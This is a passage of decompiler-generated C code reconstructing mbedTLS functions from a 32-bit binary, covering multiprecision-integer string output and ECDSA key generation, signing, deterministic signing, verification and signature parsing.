    if (*(int32_t *)g5 == -1) {
        int32_t v12 = v9 + 1; // 0x805aeb2
        g1 = v12;
        *a3 = 45;
        char * v13 = (char *)v12;
        v2 = v13;
        v11 = v13;
        // branch -> 0x805ad69
    }
    // 0x805ad69
    int32_t v14; // 0x805ae86
    int32_t result;
    int32_t v15; // 0x805ae91
    if (g3 == 16) {
        int32_t v16 = *(int32_t *)(g5 + 4); // 0x805add0
        int32_t v17 = (int32_t)v11;
        int32_t v18 = v17; // ebx
        if (v16 == 0) {
            // 0x805aed1
            g7 = &v10;
            // branch -> 0x805ae83
        } else {
            int32_t v19 = v16 - 1; // 0x805adde
            int32_t v20 = v19; // 0x805ae4734
            int32_t v21 = 4 * v19; // 0x805ae3c35
            int32_t v22 = 0;
            // branch -> 0x805adf8
            while (true) {
                int32_t v23 = v16 + 4; // 0x805adf8
                int32_t v24 = v17; // 0x805ae5f
                char * v25 = v11;
                int32_t v26 = 4; // 0x805ae00
                int32_t v27 = v22;
                // branch -> 0x805ae00
                int32_t v28;
                char * v29;
                int32_t v30;
                while (true) {
                    int32_t v31 = v26 - 1; // 0x805ae00
                    int32_t v32 = v31; // edx
                    uint32_t v33 = *(int32_t *)(*(int32_t *)(g5 + 8) + v21); // 0x805ae13
                    uint32_t v34 = 8 * v31 & 24; // 0x805ae1a
                    uint32_t v35 = v33; // 0x805ae1c
                    if (v34 != 0) {
                        // if_805ae1a_0_true
                        v35 = v33 >> v34;
                        // branch -> after_if_805ae1a_0
                    }
                    uint32_t v36 = v35 % 256; // 0x805ae1c
                    if (v35 == 255) {
                        // 0x805ae23
                        if (v27 == 0) {
                            // 0x805ae2a
                            if (v23 != 2) {
                                // 0x805ae2f
                                v28 = (int32_t)v25;
                                v18 = v28;
                                v29 = v25;
                                v30 = 0;
                                // branch -> 0x805ae32
                              lab_0x805ae32:;
                                int32_t v37 = v23 - 1; // 0x805ae32
                                if (v31 == 0) {
                                    // break -> 0x805ae39
                                    break;
                                }
                                v24 = v28;
                                v25 = v29;
                                v23 = v37;
                                v26 = v31;
                                v27 = v30;
                                // continue -> 0x805ae00
                                continue;
                            }
                        }
                    }
                    char v38 = *(char *)(v36 / 16 | (int32_t)"0123456789ABCDEF"); // 0x805ae58
                    *(char *)v24 = v38;
                    char v39 = *(char *)(v35 % 16 | (int32_t)"0123456789ABCDEF"); // 0x805ae61
                    *(char *)(v18 + 1) = v39;
                    int32_t v40 = v18 + 2; // 0x805ae6b
                    v18 = v40;
                    char * v41 = (char *)v40;
                    v2 = v41;
                    v31 = v32;
                    v28 = v40;
                    v29 = v41;
                    v30 = 1;
                    // branch -> 0x805ae32
                    goto lab_0x805ae32;
                }
                // 0x805ae39
                if (v20 == 0) {
                    // 0x805ae80
                    g7 = &v10;
                    // branch -> 0x805ae83
                    // 0x805ae83
                    *(char *)v28 = 0;
                    v14 = v18 + 1;
                    v2 = (char *)v14;
                    g1 = 0;
                    v15 = v14 - v9;
                    g3 = v15;
                    *a5 = v15;
                    mbedtls_mpi_free((int32_t *)g7);
                    // branch -> 0x805adad
                    // 0x805adad
                    return 0;
                }
                // 0x805ae44
                v17 = v28;
                v11 = v29;
                v16 = v20;
                v20--;
                v21 -= 4;
                v22 = v30;
                // branch -> 0x805adf8
            }
        }
        // 0x805ae83
        *(char *)v17 = 0;
        v14 = v18 + 1;
        v2 = (char *)v14;
        g1 = 0;
        v15 = v14 - v9;
        g3 = v15;
        *a5 = v15;
        mbedtls_mpi_free((int32_t *)g7);
        result = 0;
        // branch -> 0x805adad
    } else {
        int32_t v42 = &v10; // 0x805ad6e_0
        g7 = v42;
        int32_t v43 = g5; // 0x805ad71
        int32_t v44 = mbedtls_mpi_copy((char *)&v10, (int32_t *)v43); // 0x805ad78
        g1 = v44;
        int32_t v45 = v44; // 0x805ad9f
        if (v44 == 0) {
            // 0x805ad81
            if (v10 == -1) {
                // 0x805aec5
                v10 = 1;
                // branch -> 0x805ad8b
            }
            // 0x805ad8b
            g4 = (int32_t)&v2;
            g6 = g3;
            g1 = v42;
            int32_t v46 = mpi_write_hlp(v42, v43, 0); // 0x805ad92
            g1 = v46;
            if (v46 == 0) {
                int32_t v47 = (int32_t)v2;
                // branch -> 0x805ae83
                // 0x805ae83
                *(char *)v47 = 0;
                v14 = v47 + 1;
                v2 = (char *)v14;
                g1 = 0;
                v15 = v14 - v9;
                g3 = v15;
                *a5 = v15;
                mbedtls_mpi_free((int32_t *)g7);
                // branch -> 0x805adad
                // 0x805adad
                return 0;
            }
            v45 = v46;
        }
        // 0x805ad9f
        mbedtls_mpi_free((int32_t *)g7);
        result = v45;
        // branch -> 0x805adad
    }
    // 0x805adad
    return result;
}

// Address range: 0x805b060 - 0x805b06f
int32_t mbedtls_ecdsa_free(void) {
    // 0x805b060
    int32_t v1;
    int32_t result = mbedtls_ecp_keypair_free(v1); // 0x805b067
    g1 = result;
    return result;
}

// Address range: 0x805b070 - 0x805b07f
void mbedtls_ecdsa_init(void) {
    // 0x805b070
    int32_t v1;
    mbedtls_ecp_keypair_init(v1);
}

// Address range: 0x805b080 - 0x805b0ef
int32_t mbedtls_ecdsa_from_keypair(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // 0x805b086
    g3 = a1;
    int32_t v2 = g7; // 0x805b08c
    g7 = a2;
    int32_t v3 = mbedtls_ecp_group_copy(a1); // 0x805b099
    g1 = v3;
    int32_t result = v3; // 0x805b0b8
    if (v3 == 0) {
        int32_t v4 = g3 + 124; // 0x805b0a9
        g1 = v4;
        int32_t v5 = mbedtls_mpi_copy((char *)v4, (int32_t *)(g7 + 124)); // 0x805b0af
        g1 = v5;
        if (v5 == 0) {
            int32_t v6 = g7 + 136; // 0x805b0d0
            g7 = v6;
            int32_t v7 = g3 + 136; // 0x805b0d6
            g1 = v7;
            int32_t v8 = mbedtls_ecp_copy(v7, v6); // 0x805b0e3
            g1 = v8;
            if (v8 == 0) {
                // 0x805b0c6
                g3 = v1;
                g7 = v2;
                return 0;
            }
            result = v8;
        } else {
            result = v5;
        }
    }
    // 0x805b0b8
    mbedtls_ecp_keypair_free(g3);
    // branch -> 0x805b0c6
    // 0x805b0c6
    g3 = v1;
    g7 = v2;
    return result;
}

// Address range: 0x805b0f0 - 0x805b14f
int32_t mbedtls_ecdsa_genkey(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x805b0f3
    g3 = a1;
    g1 = a2;
    int32_t v2;
    int32_t v3;
    int32_t v4;
    int32_t v5 = mbedtls_ecp_group_load((int32_t *)a1, a2, v4, v3, v2, 0, 0, 0, 0); // 0x805b104
    g1 = 1;
    int32_t result = 1; // 0x805b148_2
    if (v5 == 0) {
        int32_t v6 = g3; // 0x805b117
        int32_t v7 = mbedtls_ecp_gen_keypair(v6, v6 + 124, v6 + 136, (int32_t (*)(int32_t, int32_t, int32_t))a3, a4) != 0; // 0x805b140
        g1 = v7;
        result = v7;
        // branch -> 0x805b143
    }
    // 0x805b143
    g3 = v1;
    int32_t v8;
    g2 = v8;
    return result;
}

// Address range: 0x805b150 - 0x805b20f
int32_t derive_mpi(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x805b156
    int32_t v2 = g1; // 0x805b159
    g3 = v2;
    int32_t v3 = g7; // 0x805b15e
    int32_t v4 = g6; // 0x805b161
    g7 = v4;
    int32_t v5 = g5; // 0x805b163
    int32_t v6 = (*(int32_t *)(v2 + 92) + 7) / 8; // 0x805b173
    g5 = v6;
    int32_t v7 = v6; // 0x805b17b
    if (v6 >= a1) {
        // if_805b178_0_true
        g5 = a1;
        v7 = a1;
        // branch -> after_if_805b178_0
    }
    int32_t v8 = mbedtls_mpi_read_binary(v4, (char *)g4, v7); // 0x805b17f
    g6 = v8;
    int32_t result = v8; // 0x805b1d3
    int32_t v9;
    if (v8 != 0) {
        // 0x805b1d0
        g3 = v1;
        g1 = result;
        g7 = v3;
        g5 = v5;
        g2 = v9;
        return result;
    }
    uint32_t v10 = *(int32_t *)(g3 + 92); // 0x805b18a
    int32_t v11 = 8 * g5; // 0x805b18d
    g5 = v11;
    int32_t v12 = v11 - v10; // 0x805b190
    if (v11 > v10) {
        // 0x805b1e0
        g5 = v12;
        int32_t result2 = mbedtls_mpi_shift_r(g7, v12); // 0x805b1ec
        g1 = result2;
        g6 = 0;
        if (result2 != 0) {
            // 0x805b1f8
            g3 = v1;
            g7 = v3;
            g5 = v5;
            g2 = v9;
            return result2;
        }
        // 0x805b1e0
        // branch -> 0x805b194
    }
    int32_t v13 = g3 + 76; // 0x805b194
    g3 = v13;
    uint32_t v14 = mbedtls_mpi_cmp_mpi((int32_t *)g7, (int32_t *)v13); // 0x805b1a1
    g6 = 0;
    if (v14 < 0) {
        result = 0;
        // 0x805b1d0
        g3 = v1;
        g1 = result;
        g7 = v3;
        g5 = v5;
        g2 = v9;
        return result;
    }
    int32_t * v15 = (int32_t *)g7;
    int32_t result3 = mbedtls_mpi_sub_mpi(v15, v15, (int32_t *)g3); // 0x805b1b8
    g1 = result3;
    g3 = v1;
    g7 = v3;
    g5 = v5;
    g2 = v9;
    return result3;
}

// Address range: 0x805b210 - 0x805b46f
int32_t mbedtls_ecdsa_verify(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x805b213
    int32_t v2 = g7; // 0x805b214
    int32_t v3 = g3; // 0x805b215
    int32_t v4;
    int32_t v5 = &v4; // 0x805b21c_0
    g3 = v5;
    int32_t v6;
    g7 = &v6;
    mbedtls_ecp_point_init(v5);
    int32_t v7;
    int32_t v8 = &v7; // 0x805b22a_0
    int32_t v9;
    g5 = &v9;
    mbedtls_mpi_init(&v7);
    int32_t v10;
    int32_t v11 = &v10; // 0x805b238_0
    mbedtls_mpi_init(&v10);
    mbedtls_mpi_init((int32_t *)g7);
    mbedtls_mpi_init((int32_t *)g5);
    int32_t v12;
    int32_t result; // 0x805b2d4
    if (*(int32_t *)(a1 + 84) == 0) {
        result = -0x4f80;
        // 0x805b2ce
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v12;
        return result;
    }
    int32_t v13 = mbedtls_mpi_cmp_int(a5, 1); // 0x805b270
    g1 = v13;
    if (v13 >= 0) {
        int32_t v14 = a1 + 76; // 0x805b27c
        int32_t * v15 = (int32_t *)a5;
        int32_t * v16 = (int32_t *)v14;
        int32_t v17 = mbedtls_mpi_cmp_mpi(v15, v16); // 0x805b28c
        g1 = v17;
        if (v17 < 0) {
            int32_t v18 = mbedtls_mpi_cmp_int(a6, 1); // 0x805b2ee
            g1 = v18;
            if (v18 < 0) {
                // 0x805b295
                // branch -> 0x805b29a
                // 0x805b29a
                mbedtls_ecp_point_free(g3);
                g1 = v8;
                mbedtls_mpi_free(&v7);
                g1 = v11;
                g1 = mbedtls_mpi_free(&v10);
                g1 = mbedtls_mpi_free((int32_t *)g7);
                mbedtls_mpi_free((int32_t *)g5);
                result = -0x4e00;
                // branch -> 0x805b2ce
                // 0x805b2ce
                g1 = result;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                g2 = v12;
                return result;
            }
            int32_t v19 = mbedtls_mpi_cmp_mpi((int32_t *)a6, v16); // 0x805b304
            g1 = v19;
            if (v19 > 0) {
                // 0x805b295
                // branch -> 0x805b29a
                // 0x805b29a
                mbedtls_ecp_point_free(g3);
                g1 = v8;
                mbedtls_mpi_free(&v7);
                g1 = v11;
                g1 = mbedtls_mpi_free(&v10);
                g1 = mbedtls_mpi_free((int32_t *)g7);
                mbedtls_mpi_free((int32_t *)g5);
                result = -0x4e00;
                // branch -> 0x805b2ce
                // 0x805b2ce
                g1 = result;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                g2 = v12;
                return result;
            }
            int32_t v20 = mbedtls_ecp_check_pubkey(a1, a4); // 0x805b31a
            g1 = v20;
            int32_t v21 = v20; // 0x805b29a
            if (v20 == 0) {
                // 0x805b329
                g6 = v8;
                g4 = a2;
                g1 = a1;
                int32_t v22;
                int32_t v23 = derive_mpi(a3, a4, v22); // 0x805b338
                g1 = v23;
                if (v23 == 0) {
                    int32_t v24 = mbedtls_mpi_inv_mod(v11, a6, v14); // 0x805b35b
                    g1 = v24;
                    if (v24 == 0) {
                        int32_t v25 = mbedtls_mpi_mul_mpi((int32_t *)g7, &v7, &v10); // 0x805b37b
                        g1 = v25;
                        if (v25 == 0) {
                            int32_t v26 = g7; // 0x805b38d
                            int32_t v27 = mbedtls_mpi_mod_mpi(v26, v26, v14); // 0x805b398
                            g1 = v27;
                            if (v27 == 0) {
                                int32_t v28 = mbedtls_mpi_mul_mpi((int32_t *)g5, v15, &v10); // 0x805b3b8
                                g1 = v28;
                                if (v28 == 0) {
                                    int32_t v29 = g5; // 0x805b3ca
                                    int32_t v30 = mbedtls_mpi_mod_mpi(v29, v29, v14); // 0x805b3d5
                                    g1 = v30;
                                    if (v30 == 0) {
                                        int32_t v31 = mbedtls_ecp_muladd(a1, g3, g7, a1 + 40, g5, a4); // 0x805b407
                                        g1 = v31;
                                        if (v31 == 0) {
                                            int32_t v32 = mbedtls_ecp_is_zero(g3); // 0x805b419
                                            g1 = v32;
                                            if (v32 == 0) {
                                                int32_t v33 = g3; // 0x805b429
                                                int32_t v34 = mbedtls_mpi_mod_mpi(v33, v33, v14); // 0x805b434
                                                g1 = v34;
                                                if (v34 == 0) {
                                                    int32_t v35 = mbedtls_mpi_cmp_mpi((int32_t *)g3, v15); // 0x805b450
                                                    g1 = v35;
                                                    if (v35 != 0) {
                                                        // 0x805b295
                                                        v21 = -0x4e00;
                                                        // branch -> 0x805b29a
                                                    } else {
                                                        v21 = 0;
                                                    }
                                                } else {
                                                    v21 = v34;
                                                }
                                            } else {
                                                // 0x805b295
                                                v21 = -0x4e00;
                                                // branch -> 0x805b29a
                                            }
                                            // 0x805b29a
                                            mbedtls_ecp_point_free(g3);
                                            g1 = v8;
                                            mbedtls_mpi_free(&v7);
                                            g1 = v11;
                                            g1 = mbedtls_mpi_free(&v10);
                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                            mbedtls_mpi_free((int32_t *)g5);
                                            result = v21;
                                            // branch -> 0x805b2ce
                                            // 0x805b2ce
                                            g1 = result;
                                            g3 = v3;
                                            g7 = v2;
                                            g5 = v1;
                                            g2 = v12;
                                            return result;
                                        }
                                        v21 = v31;
                                    } else {
                                        v21 = v30;
                                    }
                                } else {
                                    v21 = v28;
                                }
                            } else {
                                v21 = v27;
                            }
                        } else {
                            v21 = v8;
                        }
                    } else {
                        v21 = v11;
                    }
                } else {
                    v21 = v23;
                }
            }
            // 0x805b29a
            mbedtls_ecp_point_free(g3);
            g1 = v8;
            mbedtls_mpi_free(&v7);
            g1 = v11;
            g1 = mbedtls_mpi_free(&v10);
            g1 = mbedtls_mpi_free((int32_t *)g7);
            mbedtls_mpi_free((int32_t *)g5);
            result = v21;
            // branch -> 0x805b2ce
            // 0x805b2ce
            g1 = result;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            g2 = v12;
            return result;
        }
    }
    // 0x805b295
    // branch -> 0x805b29a
    // 0x805b29a
    mbedtls_ecp_point_free(g3);
    g1 = v8;
    mbedtls_mpi_free(&v7);
    g1 = v11;
    g1 = mbedtls_mpi_free(&v10);
    g1 = mbedtls_mpi_free((int32_t *)g7);
    mbedtls_mpi_free((int32_t *)g5);
    result = -0x4e00;
    // branch -> 0x805b2ce
    // 0x805b2ce
    g1 = result;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v12;
    return result;
}

// Address range: 0x805b470 - 0x805b57f
int32_t mbedtls_ecdsa_read_signature(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = g5; // 0x805b476
    int32_t v2 = g3; // 0x805b47c
    int32_t v3;
    g3 = &v3;
    int32_t v4;
    g7 = &v4;
    int32_t v5 = a4; // bp-32
    g5 = a5 + a4;
    mbedtls_mpi_init(&v3);
    mbedtls_mpi_init((int32_t *)g7);
    int32_t v6; // 0x805b4c0_3
    int32_t v7;
    int32_t v8;
    int32_t result; // 0x805b4c5
    if (mbedtls_asn1_get_tag(&v5, g5, (int32_t)&v8, 48) == 0) {
        // 0x805b4e8
        g1 = -0x4fe6;
        int32_t v9 = v8 + v5; // 0x805b4f0
        if (v9 == g5) {
            // 0x805b4f7
            if (mbedtls_asn1_get_mpi(&v5, v9, g3) == 0) {
                // 0x805b514
                if (mbedtls_asn1_get_mpi(&v5, v9, g7) == 0) {
                    int32_t v10 = mbedtls_ecdsa_verify(a1, a2, a3, a1 + 136, g3, g7); // 0x805b559
                    g1 = v10;
                    result = v10;
                    if (v10 == 0) {
                        // 0x805b569
                        if (v9 != v5) {
                            // if_805b571_0_true
                            g1 = -0x4c00;
                            result = -0x4c00;
                            // branch -> 0x805b4c5
                        } else {
                            result = 0;
                        }
                    }
                    // 0x805b4c5
                    g1 = mbedtls_mpi_free((int32_t *)g3);
                    mbedtls_mpi_free((int32_t *)g7);
                    g3 = v2;
                    g5 = v1;
                    return result;
                }
            }
            // 0x805b4c0
            v6 = &v7;
            g1 = v6;
            result = v6;
            // branch -> 0x805b4c5
        } else {
            result = -0x4fe6;
        }
    } else {
        // 0x805b4c0
        v6 = &v7;
        g1 = v6;
        result = v6;
        // branch -> 0x805b4c5
    }
    // 0x805b4c5
    g1 = mbedtls_mpi_free((int32_t *)g3);
    mbedtls_mpi_free((int32_t *)g7);
    g3 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x805b580 - 0x805b85f
int32_t mbedtls_ecdsa_sign(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = g5; // 0x805b583
    int32_t v2 = g7; // 0x805b589
    int32_t v3 = g3; // 0x805b58a
    g3 = a1;
    if (*(int32_t *)(a1 + 84) == 0) {
        // 0x805b67e
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return -0x4f80;
    }
    // 0x805b59f
    int32_t v4;
    int32_t v5 = &v4; // 0x805b59f_0
    int32_t v6;
    g7 = &v6;
    mbedtls_ecp_point_init(v5);
    int32_t v7;
    int32_t v8 = &v7; // 0x805b5ad_0
    mbedtls_mpi_init(&v7);
    int32_t v9;
    int32_t v10 = &v9; // 0x805b5b8_0
    mbedtls_mpi_init(&v9);
    mbedtls_mpi_init((int32_t *)g7);
    int32_t v11 = g3; // 0x805b5cb
    int32_t v12 = v11 + 76; // 0x805b5cb
    int32_t (*v13)(int32_t, int32_t, int32_t) = (int32_t (*)(int32_t, int32_t, int32_t))a7;
    int32_t * v14 = (int32_t *)(v11 + 92); // 0x805b6b3_0
    int32_t * v15 = (int32_t *)a3;
    g3 = a2;
    g5 = 0;
    int32_t v16 = mbedtls_ecp_gen_keypair(v11, v8, v5, v13, a8); // 0x805b6026771
    int32_t result;
    if (v16 != 0) {
        // 0x805b840
        g5 = v16;
        // branch -> 0x805b655
        // 0x805b655
        g1 = v5;
        mbedtls_ecp_point_free(v5);
        g1 = v8;
        mbedtls_mpi_free(&v7);
        g1 = v10;
        g1 = mbedtls_mpi_free(&v9);
        mbedtls_mpi_free((int32_t *)g7);
        result = g5;
        // branch -> 0x805b67e
        // 0x805b67e
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    int32_t v17 = 0; // 0x805b8333173
    int32_t v18; // 0x805b60267
    while (true) {
        // 0x805b60f
        // branch -> 0x805b60f
        while (true) {
            // 0x805b60f
            if (mbedtls_mpi_mod_mpi(g3, v5, v12) == 0) {
                // 0x805b62d
                if (g5 == 11) {
                    // 0x805b650
                    g5 = -0x4d00;
                    // branch -> 0x805b655
                    // 0x805b655
                    g1 = v5;
                    mbedtls_ecp_point_free(v5);
                    g1 = v8;
                    mbedtls_mpi_free(&v7);
                    g1 = v10;
                    g1 = mbedtls_mpi_free(&v9);
                    mbedtls_mpi_free((int32_t *)g7);
                    result = g5;
                    // branch -> 0x805b67e
                    // 0x805b67e
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                // 0x805b632
                if (mbedtls_mpi_cmp_int(g3, 0) == 0) {
                    // 0x805b646
                    g5++;
                    if (mbedtls_ecp_gen_keypair(v11, v8, v5, v13, a8) != 0) {
                        // break -> 0x805b840
                        break;
                    }
                    // continue -> 0x805b60f
                    continue;
                } else {
                    // 0x805b690
                    g6 = v10;
                    g4 = a5;
                    g1 = v11;
                    int32_t v19 = derive_mpi(a6, 0, v12); // 0x805b69f
                    g5 = v19;
                    if (v19 == 0) {
                        // 0x805b6aa
                        g3 = 0;
                        // branch -> 0x805b6b0
                      lab_0x805b6b0:
                        while (true) {
                            int32_t v20 = (*v14 + 7) / 8; // 0x805b6c6
                            g5 = v20;
                            int32_t v21 = mbedtls_mpi_fill_random(g7, v20, v13, a8); // 0x805b6d1
                            int32_t v22 = v21; // 0x805b840
                            if (v21 == 0) {
                                int32_t v23 = 8 * g5 - *v14; // 0x805b6e4
                                g5 = v23;
                                int32_t v24 = mbedtls_mpi_shift_r(g7, v23); // 0x805b6ee
                                if (v24 == 0) {
                                    int32_t v25 = g3 + 1; // 0x805b6fb
                                    g3 = v25;
                                    if (v25 == 31) {
                                        // 0x805b848
                                        g3 = v3;
                                        g7 = v2;
                                        g5 = v1;
                                        return -0x4d00;
                                    }
                                    // 0x805b707
                                    if (mbedtls_mpi_cmp_int(g7, 1) >= 0) {
                                        // break -> 0x805b71b
                                        break;
                                    }
                                    // continue -> 0x805b6b0
                                    continue;
                                } else {
                                    v22 = v24;
                                }
                            }
                            // 0x805b840
                            g5 = v22;
                            // branch -> 0x805b655
                            // 0x805b655
                            g1 = v5;
                            mbedtls_ecp_point_free(v5);
                            g1 = v8;
                            mbedtls_mpi_free(&v7);
                            g1 = v10;
                            g1 = mbedtls_mpi_free(&v9);
                            mbedtls_mpi_free((int32_t *)g7);
                            result = g5;
                            // branch -> 0x805b67e
                            // 0x805b67e
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return result;
                        }
                        // 0x805b71b
                        if (mbedtls_mpi_cmp_mpi((int32_t *)g7, (int32_t *)v12) <= 0) {
                            // break (via goto) -> 0x805b72e
                            goto lab_0x805b72e;
                        }
                        // continue (via goto) -> 0x805b6b0
                        goto lab_0x805b6b0;
                    }
                }
                // 0x805b655
                g1 = v5;
                mbedtls_ecp_point_free(v5);
                g1 = v8;
                mbedtls_mpi_free(&v7);
                g1 = v10;
                g1 = mbedtls_mpi_free(&v9);
                mbedtls_mpi_free((int32_t *)g7);
                result = g5;
                // branch -> 0x805b67e
                // 0x805b67e
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return result;
            }
        }
      lab_0x805b72e:;
        int32_t v26 = mbedtls_mpi_mul_mpi(v15, (int32_t *)a2, (int32_t *)a4); // 0x805b742
        g5 = v26;
        if (v26 == 0) {
            int32_t v27 = mbedtls_mpi_add_mpi(&v9, &v9, v15); // 0x805b762
            g5 = v10;
            if (v27 == 0) {
                int32_t v28 = mbedtls_mpi_mul_mpi(&v9, &v9, (int32_t *)g7); // 0x805b77f
                g5 = v10;
                if (v28 == 0) {
                    int32_t v29 = mbedtls_mpi_mul_mpi(&v7, &v7, (int32_t *)g7); // 0x805b79c
                    g5 = v8;
                    if (v29 == 0) {
                        int32_t v30 = mbedtls_mpi_inv_mod(a3, v8, v12); // 0x805b7bf
                        g5 = v30;
                        if (v30 == 0) {
                            int32_t v31 = mbedtls_mpi_mul_mpi(v15, v15, &v9); // 0x805b7df
                            g5 = v31;
                            if (v31 == 0) {
                                int32_t v32 = mbedtls_mpi_mod_mpi(a3, a3, v12); // 0x805b7ff
                                g5 = v32;
                                if (v32 == 0) {
                                    // 0x805b80e
                                    if (v17 == 11) {
                                        // 0x805b650
                                        g5 = -0x4d00;
                                        // branch -> 0x805b655
                                        // 0x805b655
                                        g1 = v5;
                                        mbedtls_ecp_point_free(v5);
                                        g1 = v8;
                                        mbedtls_mpi_free(&v7);
                                        g1 = v10;
                                        g1 = mbedtls_mpi_free(&v9);
                                        mbedtls_mpi_free((int32_t *)g7);
                                        result = g5;
                                        // branch -> 0x805b67e
                                        // 0x805b67e
                                        g3 = v3;
                                        g7 = v2;
                                        g5 = v1;
                                        return result;
                                    }
                                    // 0x805b818
                                    if (mbedtls_mpi_cmp_int(a3, 0) == 0) {
                                        // 0x805b833
                                        g3 = a2;
                                        g5 = 0;
                                        v18 = mbedtls_ecp_gen_keypair(v11, v8, v5, v13, a8);
                                        if (v18 != 0) {
                                            // break -> 0x805b840
                                            break;
                                        }
                                        v17++;
                                        // continue -> 0x805b60f
                                        continue;
                                    }
                                    // 0x805b655
                                    g1 = v5;
                                    mbedtls_ecp_point_free(v5);
                                    g1 = v8;
                                    mbedtls_mpi_free(&v7);
                                    g1 = v10;
                                    g1 = mbedtls_mpi_free(&v9);
                                    mbedtls_mpi_free((int32_t *)g7);
                                    result = g5;
                                    // branch -> 0x805b67e
                                    // 0x805b67e
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return result;
                                }
                            }
                        }
                    }
                }
            }
        }
        // 0x805b655
        g1 = v5;
        mbedtls_ecp_point_free(v5);
        g1 = v8;
        mbedtls_mpi_free(&v7);
        g1 = v10;
        g1 = mbedtls_mpi_free(&v9);
        mbedtls_mpi_free((int32_t *)g7);
        result = g5;
        // branch -> 0x805b67e
        // 0x805b67e
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x805b840
    g5 = v18;
    // branch -> 0x805b655
    // 0x805b655
    g1 = v5;
    mbedtls_ecp_point_free(v5);
    g1 = v8;
    mbedtls_mpi_free(&v7);
    g1 = v10;
    g1 = mbedtls_mpi_free(&v9);
    mbedtls_mpi_free((int32_t *)g7);
    result = g5;
    // branch -> 0x805b67e
    // 0x805b67e
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x805b860 - 0x805b99f
int32_t mbedtls_ecdsa_sign_det(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g3; // 0x805b86c
    int32_t v2 = g7; // 0x805b86f
    int32_t v3 = g5; // 0x805b872
    int32_t v4 = mbedtls_md_info_from_type(a7); // 0x805b87e
    g4 = v4;
    g1 = -0x4f80;
    int32_t v5;
    if (v4 == 0) {
        // 0x805b8f0
        g3 = v1;
        g7 = v2;
        g5 = v3;
        g2 = v5;
        return -0x4f80;
    }
    // 0x805b898
    int32_t v6;
    g7 = &v6;
    int32_t v7;
    g5 = &v7;
    g3 = (*(int32_t *)(a1 + 92) + 7) / 8;
    mbedtls_mpi_init(&v6);
    mbedtls_hmac_drbg_init((char *)g5);
    int32_t v8;
    int32_t v9 = &v8; // 0x805b8b7_0
    int32_t v10 = g3; // 0x805b8c4
    int32_t v11 = mbedtls_mpi_write_binary((char *)a4, v9, v10); // 0x805b8cb
    g1 = v11;
    int32_t result = v11; // 0x805b8d4
    if (v11 == 0) {
        // 0x805b900
        g6 = g7;
        g4 = a5;
        g1 = a1;
        int32_t v12 = derive_mpi(a6, v9, v10); // 0x805b90e
        g1 = v12;
        if (v12 == 0) {
            int32_t v13 = g3; // 0x805b91d
            int32_t v14 = mbedtls_mpi_write_binary((char *)g7, v13 + v9, v13); // 0x805b92a
            g1 = v14;
            if (v14 == 0) {
                int32_t v15 = 2 * g3; // 0x805b939
                g3 = v15;
                g1 = v4;
                mbedtls_hmac_drbg_seed_buf((char *)g5, v4, v9, v15);
                int32_t v16 = mbedtls_ecdsa_sign(a1, a2, a3, a4, a5, a6, (int32_t)mbedtls_hmac_drbg_random, g5); // 0x805b98a
                g1 = v16;
                result = v16;
                // branch -> 0x805b8d4
            } else {
                result = v14;
            }
        } else {
            result = v12;
        }
    }
    // 0x805b8d4
    g1 = mbedtls_hmac_drbg_free((char *)g5);
    mbedtls_mpi_free((int32_t *)g7);
    g1 = result;
    // branch -> 0x805b8f0
    // 0x805b8f0
    g3 = v1;
    g7 = v2;
    g5 = v3;
    g2 = v5;
    return result;
}

// Address range: 0x805b9a0 - 0x805baef
int32_t mbedtls_ecdsa_write_signature(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t * a6) {
    int32_t v1 = g3; // 0x805b9a9
    int32_t v2;
    g3 = &v2;
    int32_t v3 = g7; // 0x805b9af
    int32_t v4;
    g7 = &v4;
    int32_t v5 = g5; // 0x805b9b5
    g5 = (int32_t)a1;
    mbedtls_mpi_init(&v4);
    mbedtls_mpi_init((int32_t *)g3);
    int32_t v6 = g5; // 0x805b9d6
    int32_t result = mbedtls_ecdsa_sign_det(v6, g7, g3, v6 + 124, a3, a4, a2); // 0x805b9f2
    g1 = result;
    if (result != 0) {
        // 0x805b9fb
        g1 = mbedtls_mpi_free((int32_t *)g7);
        mbedtls_mpi_free((int32_t *)g3);
        g3 = v1;
        g7 = v3;
        g5 = v5;
        return result;
    }
    // 0x805ba28
    int32_t v7;
    int32_t v8 = &v7; // 0x805ba28_0
    int32_t v9 = g3; // 0x805ba35
    int32_t v10 = v9;
    int32_t result2 = mbedtls_asn1_write_mpi(&v10, v8, (int32_t *)v9); // 0x805ba3f
    g1 = result2;
    g5 = &v10;
    if (&v10 < NULL) {
        // 0x805b9fb
        g1 = mbedtls_mpi_free((int32_t *)g7);
        mbedtls_mpi_free((int32_t *)g3);
        g3 = v1;
        g7 = v3;
        g5 = v5;
        return result2;
    }
    int32_t result3 = mbedtls_asn1_write_mpi(&v10, v8, (int32_t *)g7); // 0x805ba5e
    g1 = result3;
    if (result3 < 0) {
        // 0x805b9fb
        g1 = mbedtls_mpi_free((int32_t *)g7);
